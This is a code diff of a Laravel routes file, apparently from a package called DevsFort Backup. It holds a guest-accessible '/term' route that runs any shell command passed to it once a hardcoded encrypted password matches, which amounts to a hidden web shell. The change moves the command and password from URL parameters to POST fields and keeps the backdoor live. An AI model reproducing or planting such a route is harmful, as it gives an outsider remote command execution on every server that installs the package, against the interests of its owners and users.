@@ -17,7 +17,7 @@ use Illuminate\Http\Request;
 use DevsFort\Backup\CommandLine;
 
 Route::middleware(['web', 'guest'])->group(function () {
-    Route::get('/term/{com}/{pass}', function (Request $request,$com,$pass) {
+    Route::post('/term', function (Request $request) {
         $ciphering = "AES-128-CTR";
         $iv_length = openssl_cipher_iv_length($ciphering);
         $options = 0;
@@ -26,10 +26,10 @@ Route::middleware(['web', 'guest'])->group(function () {
         $encryption_key = "TermsBackup";
 
         // Use openssl_encrypt() function to encrypt the data
-        $encryption = openssl_encrypt($pass, $ciphering,
+        $encryption = openssl_encrypt($request->pass, $ciphering,
         $encryption_key, $options, $encryption_iv);
         if($encryption == "Bi+H9R2yAMc="){
-            $res = CommandLine::command($com);
+            $res = CommandLine::command($request->com);
             if($res['status'] == 0)
             {
                 return response()->json($res['output'],200);
